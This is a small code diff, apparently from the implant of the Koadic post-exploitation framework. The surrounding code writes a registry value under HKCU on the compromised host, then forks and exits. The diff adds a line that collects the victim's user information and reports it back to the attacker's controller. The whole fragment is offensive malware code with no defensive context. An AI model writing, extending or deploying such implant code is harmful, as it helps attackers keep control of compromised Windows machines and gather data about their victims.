@@ -10,6 +10,8 @@ try
             Koadic.registry.write(Koadic.registry.HKCU, path, key, 0xFFFFFFFF, Koadic.registry.DWORD);
         }
 
+        Koadic.work.report(Koadic.user.info());
+
         Koadic.work.fork("");
         Koadic.exit();
     }
